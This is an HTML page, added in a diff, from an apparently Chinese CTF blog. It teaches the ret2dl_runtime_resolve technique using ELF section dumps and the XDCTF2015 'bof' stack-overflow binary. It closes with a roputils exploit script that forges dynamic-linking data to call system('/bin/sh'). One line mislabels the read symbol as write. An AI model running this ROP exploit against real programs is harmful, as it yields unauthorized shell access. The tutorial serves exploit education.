@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    
+    <title>Introduction to pwn1.4--ret2dl_runtime_resolve | Room of Requirement | pwn what you want</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="pwn,stack">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="/css/third-party/swipebox.min.css?v=1.3.2">
+    <link rel="stylesheet" href="/css/style.css?v=1.3.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"siriuswhiter","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Sirius Whiter</h5>
+          <a href="mailto:xuewenjie2017@outlook.com" title="xuewenjie2017@outlook.com" class="mail">
+            
+              <span>x</span>
+            
+              <span>u</span>
+            
+              <span>e</span>
+            
+              <span>w</span>
+            
+              <span>e</span>
+            
+              <span>n</span>
+            
+              <span>j</span>
+            
+              <span>i</span>
+            
+              <span>e</span>
+            
+              <span>2</span>
+            
+              <span>0</span>
+            
+              <span>1</span>
+            
+              <span>7</span>
+            
+              <span>@</span>
+            
+              <span>o</span>
+            
+              <span>u</span>
+            
+              <span>t</span>
+            
+              <span>l</span>
+            
+              <span>o</span>
+            
+              <span>o</span>
+            
+              <span>k</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/siriuswhiter" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://github.com/siriuswhiter" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        
+	
+<header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>Introduction to pwn1.4--ret2dl_runtime_resolve</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">Introduction to pwn1.4--ret2dl_runtime_resolve</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-03-19T23:12:54.000Z" itemprop="datePublished" class="page-time">
+  2019-03-20
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+
+
+<div class="container body-wrap">
+    <article id="post-introduction-to-pwn1-4-ret2dl_runtime_resolve"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">Introduction to pwn1.4--ret2dl_runtime_resolve</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-03-20 07:12:54" datetime="2019-03-19T23:12:54.000Z"  itemprop="datePublished">2019-03-20</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h1><p>ELF可执行文件由ELF头部，程序头部表和其对应的段，节头部表和其对应的节组成。</p>
+<p>如果一个可执行文件参与动态链接，它的程序头部表将包含类型为PT_DYNAMIC的段，它包含.dynamic节。结构如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    union &#123;</span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ readelf -d bof</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xf14 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x8048358</span><br><span class="line"> 0x0000000d (FINI)                       0x8048624</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x8049f08</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x8049f0c</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x80481ac</span><br><span class="line"> 0x00000005 (STRTAB)                     0x8048278</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x80481d8</span><br><span class="line"> 0x0000000a (STRSZ)                      107 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x804a000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   40 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x8048330</span><br><span class="line"> 0x00000011 (REL)                        0x8048318</span><br><span class="line"> 0x00000012 (RELSZ)                      24 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x80482f8</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x80482e4</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure>
+<p>节中包含目标文件的所有信息。节的结构如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Word sh_name;      // 节头部字符串表节区的索引</span><br><span class="line">    Elf32_Word sh_type;      // 节类型</span><br><span class="line">    Elf32_Word sh_flags;     // 节标志，用于描述属性</span><br><span class="line">    Elf32_Addr sh_addr;      // 节的内存映像</span><br><span class="line">    Elf32_Off  sh_offset;    // 节的文件偏移</span><br><span class="line">    Elf32_Word sh_size;      // 节的长度</span><br><span class="line">    Elf32_Word sh_link;      // 节头部表索引链接</span><br><span class="line">    Elf32_Word sh_info;      // 附加信息</span><br><span class="line">    Elf32_Word sh_addralign; // 节对齐约束</span><br><span class="line">    Elf32_Word sh_entsize;   // 固定大小的节表项的长度</span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ readelf -S bof</span><br><span class="line">There are 31 section headers, starting at offset 0x18a4:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000a0 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          08048278 000278 00006b 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          080482e4 0002e4 000014 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         080482f8 0002f8 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048318 000318 000018 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048330 000330 000028 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        08048358 000358 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048380 000380 000060 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        080483f0 0003f0 000232 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        08048624 000624 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        08048638 000638 000008 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        08048640 000640 000034 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        08048674 000674 0000f4 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000020 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a020 001020 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a040 001028 00000c 00  WA  0   0 32</span><br><span class="line">  [27] .comment          PROGBITS        00000000 001028 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 001798 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001060 0004b0 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 001510 000288 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure>
+<p>几个重要的节：</p>
+<ol>
+<li>.rel.plt节是用于函数重定位，.rel.dyn节是用于变量重定位</li>
+</ol>
+<p>ida 观察如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048318 ; ELF REL Relocation Table /r_offset r_info</span><br><span class="line">LOAD:08048318                 Elf32_Rel &lt;8049FFCh,  306h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048320                 Elf32_Rel &lt;804A040h,  905h&gt; ; R_386_COPY stdin</span><br><span class="line">LOAD:08048328                 Elf32_Rel &lt;804A044h,  705h&gt; ; R_386_COPY stdout</span><br><span class="line">LOAD:08048330 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:08048330                 Elf32_Rel &lt;804A00Ch,  107h&gt; ; R_386_JMP_SLOT setbuf</span><br><span class="line">LOAD:08048338                 Elf32_Rel &lt;804A010h,  207h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:08048340                 Elf32_Rel &lt;804A014h,  407h&gt; ; R_386_JMP_SLOT strlen</span><br><span class="line">LOAD:08048348                 Elf32_Rel &lt;804A018h,  507h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:08048350                 Elf32_Rel &lt;804A01Ch,  607h&gt; ; R_386_JMP_SLOT write</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>.got节保存全局变量偏移表，.got.plt节保存全局函数偏移表。.got.plt对应着Elf32_Rel结构中r_offset的值。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC</span><br><span class="line">.got.plt:0804A004 dword_804A004   dd 0                    ; DATA XREF: sub_8048380↑r</span><br><span class="line">.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: sub_8048380+6↑r</span><br><span class="line">.got.plt:0804A00C off_804A00C     dd offset setbuf        ; DATA XREF: _setbuf↑r</span><br><span class="line">.got.plt:0804A010 off_804A010     dd offset read          ; DATA XREF: _read↑r</span><br><span class="line">.got.plt:0804A014 off_804A014     dd offset strlen        ; DATA XREF: _strlen↑r</span><br><span class="line">.got.plt:0804A018 off_804A018     dd offset __libc_start_main</span><br><span class="line">.got.plt:0804A018                                         ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0804A01C off_804A01C     dd offset write         ; DATA XREF: _write↑r</span><br><span class="line">.got.plt:0804A01C _got_plt        ends</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>.dynsym节包含了动态链接符号表。Elf32_Sym[num]中的num对应着ELF32_R_SYM(Elf32_Rel-&gt;r_info)。</li>
+</ol>
+<p>而根据定义有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info) &gt;&gt; 8</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    Elf32_Word st_name;     // Symbol name(string tbl index)</span><br><span class="line">    Elf32_Addr st_value;    // Symbol value</span><br><span class="line">    Elf32_Word st_size;     // Symbol size</span><br><span class="line">    unsigned char st_info;  // Symbol type and binding</span><br><span class="line">    unsigned char st_other; // Symbol visibility under glibc&gt;=2.2</span><br><span class="line">    Elf32_Section st_shndx; // Section index</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure></p>
+<p>read索引值为ELF32_R_SYM(0x207) = 0x207 &gt;&gt; 8 = 2。而Elf32_Sym[2]即保存着write的符号表信息。</p>
+<p>并且ELF32_R_TYPE(0x207) = 7，对应R_386_JUMP_SLOT。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481D8 ; ELF Symbol Table</span><br><span class="line">LOAD:080481D8                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481E8                 Elf32_Sym &lt;offset aSetbuf - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;setbuf&quot;</span><br><span class="line">LOAD:080481F8                 Elf32_Sym &lt;offset aRead - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:08048208                 Elf32_Sym &lt;offset aGmonStart - offset byte_8048278, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:08048218                 Elf32_Sym &lt;offset aStrlen - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;strlen&quot;</span><br><span class="line">LOAD:08048228                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_8048278, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:08048228                            0&gt;</span><br><span class="line">LOAD:08048238                 Elf32_Sym &lt;offset aWrite - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;</span><br><span class="line">LOAD:08048248                 Elf32_Sym &lt;offset aStdout - offset byte_8048278, \ ; &quot;stdout&quot;</span><br><span class="line">LOAD:08048248                            offset stdout@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:08048258                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_8048278, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:08048258                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br><span class="line">LOAD:08048268                 Elf32_Sym &lt;offset aStdin - offset byte_8048278, \ ; &quot;stdin&quot;</span><br><span class="line">LOAD:08048268                            offset stdin@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>.dynstr节包含了动态链接的字符串。这个节以\x00作为开始和结尾，中间每个字符串也以\x00间隔。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048278 ; ELF String Table</span><br><span class="line">LOAD:08048278 byte_8048278    db 0                    ; DATA XREF: LOAD:080481E8↑o</span><br><span class="line">LOAD:08048278                                         ; LOAD:080481F8↑o ...</span><br><span class="line">LOAD:08048279 aLibcSo6        db &apos;libc.so.6&apos;,0</span><br><span class="line">LOAD:08048283 aIoStdinUsed    db &apos;_IO_stdin_used&apos;,0   ; DATA XREF: LOAD:08048258↑o</span><br><span class="line">LOAD:08048292 aStdin          db &apos;stdin&apos;,0            ; DATA XREF: LOAD:08048268↑o</span><br><span class="line">LOAD:08048298 aStrlen         db &apos;strlen&apos;,0           ; DATA XREF: LOAD:08048218↑o</span><br><span class="line">LOAD:0804829F aRead           db &apos;read&apos;,0             ; DATA XREF: LOAD:080481F8↑o</span><br><span class="line">LOAD:080482A4 aStdout         db &apos;stdout&apos;,0           ; DATA XREF: LOAD:08048248↑o</span><br><span class="line">LOAD:080482AB aSetbuf         db &apos;setbuf&apos;,0           ; DATA XREF: LOAD:080481E8↑o</span><br><span class="line">LOAD:080482B2 aLibcStartMain  db &apos;__libc_start_main&apos;,0</span><br><span class="line">LOAD:080482B2                                         ; DATA XREF: LOAD:08048228↑o</span><br><span class="line">LOAD:080482C4 aWrite          db &apos;write&apos;,0            ; DATA XREF: LOAD:08048238↑o</span><br><span class="line">LOAD:080482CA aGmonStart      db &apos;__gmon_start__&apos;,0   ; DATA XREF: LOAD:08048208↑o</span><br><span class="line">LOAD:080482D9 aGlibc20        db &apos;GLIBC_2.0&apos;,0</span><br></pre></td></tr></table></figure>
+<p>Elf32_Sym[2]-&gt;st_name=0x27（.dynsym + Elf32_Sym_size * num），所以.dynstr加上0x27的偏移量，就是字符串read。</p>
+<ol start="5">
+<li>.plt节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。</li>
+</ol>
+<h1 id="example"><a href="#example" class="headerlink" title="example"></a>example</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v3; // eax</span><br><span class="line">  char buf[4]; // [esp+0h] [ebp-6Ch]</span><br><span class="line">  char v6; // [esp+18h] [ebp-54h]</span><br><span class="line">  int *v7; // [esp+64h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);</span><br><span class="line">  memset(&amp;v6, 0, 0x4Cu);</span><br><span class="line">  setbuf(stdout, buf);</span><br><span class="line">  v3 = strlen(buf);</span><br><span class="line">  write(1, buf, v3);</span><br><span class="line">  vuln();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+Ch] [ebp-6Ch]</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, &amp;buf);</span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="正常攻击"><a href="#正常攻击" class="headerlink" title="正常攻击"></a>正常攻击</h2><h2 id="roputils"><a href="#roputils" class="headerlink" title="roputils"></a>roputils</h2><p>相对而言特别方便的工具，可以自动生成需要伪造的section，并且通过函数调用直接ROP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">r = process(&apos;./bof&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">rop = ROP(&apos;./bof&apos;)</span><br><span class="line">offset = 112</span><br><span class="line">bss_base = rop.section(&apos;.bss&apos;)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(&apos;read&apos;, 0, bss_base, 100)</span><br><span class="line">## used to call dl_Resolve()</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">## used to make faking data, such relocation, Symbol, Str</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, &apos;system&apos;)</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-03-20T10:38:08.097Z" itemprop="dateUpdated">2019-03-20 18:38:08</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/" target="_blank" rel="external">http://siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/</a>
+        
+    </div>
+    <footer>
+        <a href="http://siriuswhiter.tk">
+            <img src="/img/avatar.jpg" alt="Sirius Whiter">
+            Sirius Whiter
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/">stack</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/&title=《Introduction to pwn1.4--ret2dl_runtime_resolve》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
